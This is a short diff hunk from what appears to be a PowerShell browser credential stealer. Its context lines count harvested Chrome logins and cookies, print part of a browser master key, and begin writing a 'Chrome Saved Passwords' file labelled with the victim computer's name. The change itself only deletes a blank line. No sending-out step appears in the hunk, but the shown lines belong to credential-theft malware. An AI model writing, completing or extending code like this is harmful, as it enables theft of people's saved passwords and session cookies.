@@ -574,7 +574,6 @@ Logins: `$($Logins.Count)`
 Cookies: `$($Cookies.Count)`
 Key: `$($MasterKeyB64.Substring(0, [Math]::Min(40, $MasterKeyB64.Length)))...`
 "@
-    
     # ─── Prepara arquivo de logins ───
     $loginLines = @()
     $loginLines += "Chrome Saved Passwords - $computer - $timestamp"
